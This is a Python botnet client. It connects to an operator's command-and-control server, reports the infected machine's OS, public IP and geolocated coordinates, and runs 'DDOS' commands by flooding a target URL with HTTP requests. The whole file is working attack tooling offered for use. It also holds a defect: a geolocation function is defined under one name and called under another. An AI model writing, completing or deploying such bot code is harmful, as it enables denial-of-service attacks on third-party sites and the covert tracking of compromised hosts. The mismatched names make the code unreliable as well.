import socket
import platform
import time
import requests
from geopy.geocoders import Nominatim

SERVER_IP = "127.0.0.1"  # Replace with your server's IP address
SERVER_PORT = 4444       # Port on which the server is listening

def get_local_ip():
    """
    Uses socket to get the bot's local IP address.
    """
    try:
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        temp_socket.connect(("8.8.8.8", 80))  # Connect to a public DNS server
        ip = temp_socket.getsockname()[0]
        temp_socket.close()
        print(f"[Bot] Local IP Address: {ip}")
        return ip
    except Exception as e:
        print(f"[Bot] Error determining local IP address: {e}")
        return None

def get_public_ip():
    """
    Retrieves the public IP address of the bot using ipify API.
    """
    try:
        response = requests.get("https://api.ipify.org")
        public_ip = response.text.strip()
        print(f"[Bot] Public IP Address: {public_ip}")
        return public_ip
    except Exception as e:
        print(f"[Bot] Error retrieving public IP: {e}")
        return None

def get_location_by_geopy(ip):
    """
    Use a GeoIP API to fetch latitude and longitude based on the public IP address.
    """
    try:
        if not ip:
            print("[Bot] No IP address available for geolocation.")
            return None, None

        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            if data["status"] == "success":
                latitude, longitude = data["lat"], data["lon"]
                print(f"[Bot] Location found: {latitude}, {longitude}")
                return latitude, longitude
            else:
                print(f"[Bot] GeoIP lookup failed: {data.get('message', 'Unknown error')}")
                return None, None
        else:
            print(f"[Bot] Failed to fetch geolocation: Status {response.status_code}")
            return None, None
    except Exception as e:
        print(f"[Bot] Error determining location: {e}")
        return None, None

def send_metadata(client_socket):
    """
    Sends bot metadata (OS info, public IP, and location) to the server.
    """
    try:
        os_info = platform.system() + " " + platform.release()
        public_ip = get_public_ip()
        latitude, longitude = get_location_by_geoip(public_ip)

        if public_ip and latitude is not None and longitude is not None:
            metadata = f"{os_info}|{latitude}|{longitude}"
            client_socket.send(metadata.encode('utf-8'))
            print(f"[Bot] Sent metadata: {metadata}")
        else:
            print("[Bot] Could not send metadata due to missing location.")
    except Exception as e:
        print(f"[Bot] Error sending metadata: {e}")

def handle_commands(client_socket):
    """
    Listens for commands from the server and executes them.
    """
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            print(f"[Bot] Received command: {command}")

            if command.startswith("DDOS"):
                _, target_url, rounds = command.split()
                rounds = int(rounds)
                for i in range(rounds):
                    try:
                        response = requests.get(target_url)
                        print(f"[Bot] Request {i+1}/{rounds} to {target_url} completed with status {response.status_code}")
                    except Exception as e:
                        print(f"[Bot] Error sending request to {target_url}: {e}")
            else:
                print(f"[Bot] Unknown command: {command}")

        except Exception as e:
            print(f"[Bot] Connection to server lost: {e}")
            break

def connect_to_server():
    """
    Connects the bot to the server and handles communication.
    """
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print("[Bot] Connected to the server")

            send_metadata(client_socket)
            handle_commands(client_socket)

        except Exception as e:
            print(f"[Bot] Error connecting to server: {e}")
            print("[Bot] Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    connect_to_server()
